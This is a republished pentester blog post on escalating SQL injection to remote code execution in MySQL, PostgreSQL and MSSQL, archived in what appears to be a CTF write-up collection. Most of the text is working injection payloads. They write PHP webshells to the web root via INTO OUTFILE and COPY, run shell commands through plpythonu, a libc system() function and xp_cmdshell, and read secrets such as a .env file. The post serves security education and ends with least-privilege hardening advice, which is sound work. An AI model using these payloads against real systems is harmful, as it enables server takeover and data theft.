# :globe_with_meridians: 5 Ways I Got Rces 99A78901Ba33

> **Original Source:** [5 Ways I Got Rces 99A78901Ba33](https://infosecwriteups.com/5-ways-i-got-rces-99a78901ba33)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

## 1 — SQL Injection


SQL injections are well known as maybe the most famous web attack, providing the attacker control over the target’s database. But except for data exfiltration, SQL injection could be even more dangerous, allowing the attacker to execute commands over the OS of the target.


Remote Code Execution (RCE) through SQL injection can occur when attackers exploit vulnerabilities in database queries to execute system commands. Different database management systems (DBMS) like MySQL, PostgreSQL, and MSSQL provide varying capabilities for executing OS-level commands, which attackers can leverage under specific circumstances.


An important disclaimer here, is that the SQL service is the one that we are manipulating, not the web service (like Apache or Nginx). Hence, achieving RCE depends on the privileges the SQL service has on the target server.

### MySQL


Assuming that you found a SELECT statement that lets you to inject your malicious query, there are two main options you can work with. The first and the better option is using the `OUTFILE `function of MySQL. The `OUTFILE` option in MySQL is used to write the result of a query to a file on the server's filesystem. We can use this function to write, for example, a webshell by trying something like this:


```
' UNION SELECT "<?php exec($_GET['shell']) ?>" INTO OUTFILE "/var/www/html/upload.php";
```


I had an engagement that when I tried to do that I was getting error messages, indicating that the MySQL service doesn’t have enough permissions to write a file to the directories I tried. But then I changed the file path a few times and luckily I found a path that I can write a file in.


The second option in MySQL injection is to use the function `LOAD_FILE()`. The `LOAD_FILE()` function in MySQL is used to read the contents of a file located on the server and return it as a string. It is commonly used to fetch the contents of text-based files, such as configuration files or logs, into a query result.


If this function works, you might be able to use it as a path traversal attack in order to read sensitive files from the server, hoping to get something like SSH private keys or passwords. But this is not that promising like the previous function that me mentioned here.

### PostgreSQL


With PostgreSQL we also have few options available to use. The first one is by using the `COPY`function in order to create a new file, pretty similar to what we saw in the MySQL example before:


```
1; COPY (SELECT '<?php system($_GET["shell"]) ?>') TO '/var/www/html/chux.php'; --
```


For reading sensitive file on the system, we can use the `pg_read_file()`function:


```
SELECT pg_read_file('/var/www/html/.env',0,1000);
```


Another and more creative way to get RCE on this DBMS, is by using its scripting languages installed on the system to execute arbitrary code. The following query can tell us what scripting languages are supported in the target DB:


```
SELECT lanname,lanpltrusted,lanacl FROM pg_language;
```


If you have a supported scripting language, you can use it for creating a custom script to execute whatever you want:


```
1; CREATE FUNCTION rce() RETURNS VOID AS $$
import os
os.system('echo pwned > /tmp/chux.txt')
$$ LANGUAGE plpythonu; SELECT rce(); --
```


For further reading about abusing PostgreSQL scripting language to achieve RCE, please read [this excellent guide here](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md).


And lastly for PostgreSQL, a [cool trick I learned from OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL) and I had the chance to use it on an e-commerce website I pentested, is to inject a custom function linked to libc.


In order to do so, we need the following steps:


- Create a table for the output (stdout)

- Run a shell command that referencing this output

- Use the COPY function to get the output of your shell command to the output table you created


The example in OWASP’s website looks like this:


```
/store.php?id=1; CREATE TABLE stdout(id serial, system_out text) --
/store.php?id=1; CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6','system' LANGUAGE 'C'
STRICT --
/store.php?id=1; SELECT system('uname -a > /tmp/test') --
/store.php?id=1; COPY stdout(system_out) FROM '/tmp/test' --
/store.php?id=1 UNION ALL SELECT NULL,(SELECT system_out FROM stdout ORDER BY id DESC),NULL LIMIT 1 OFFSET 1--
```


### MSSQL


Finally in the SQL injection category is the MSSQL. Here, there are some famous stored procedures that come to our help in order to run OS commands from the DB on the OS itself.


The native way MSSQL server lets us run OS commands is via `xp_cmdshell `. This stored procedure is disabled by default and can be activated only by the sa user, the system admin.


An example to a simple `xp_cmdshell `command:


```
EXEC xp_cmdshell 'ipconfig';
```


Assuming that you managed to find an “injectable” point, if you have the *sa* user or any other privileged account, you might be able to get RCE on your target!


If you have enough permissions to run `xp_cmdshell`but it’s disabled, you van enable it by running the following command:


```
1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```


And lastly, for executing a shell command, you can just what ever cmdlet you want:


```
1; EXEC xp_cmdshell 'ping chux.io'; EXEC xp_cmdshell 'dir C:\\users'; --
```


This is the place to mention that except for `xp_cmdshell, `there few more stored procedures that we can use in order to manipulate the target server:


- `xp_regread — `reading from the Registry. Example:


```
EXEC xp_regread
@rootkey = 'HKEY_LOCAL_MACHINE',
@key = 'SOFTWARE\Microsoft\Windows Defender',
@value_name = 'DisableAntiSpyware';
```


- `xp_regwrite — `writing to the Registry. Example:


```
EXEC xp_regwrite
@rootkey = 'HKEY_LOCAL_MACHINE',
@key = 'SYSTEM\CurrentControlSet\Services\MyService',
@value_name = 'Start',
@type = 'REG_DWORD',
@value = '2';
```


- `sp_send_dbmail — `replaced `xp_sendmail`. Example:


```
EXEC msdb.dbo.sp_send_dbmail
@profile_name = 'DefaultProfile',
@recipients = 'chux@chux.io',
@subject = 'Test Email',
@body = 'This is a test email sent from SQL Server.';
```


To sum up SQLi to RCE, there are multiple ways to run arbitrary code on the server via the SQL service. Of course that as a best practice, it’s recommended to system admins to grant the least privileges to these services and that the SQL functions that we mentioned should be disabled, because usually they rarely in use.


And yet, I still found in the wild enough SQL servers that could read/write files on the server. So whenever you find SQLi, always try to enumerate your privileges in order to escalate it to maximum impact!

---

*Originally published on [Medium](https://infosecwriteups.com/5-ways-i-got-rces-99a78901ba33). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
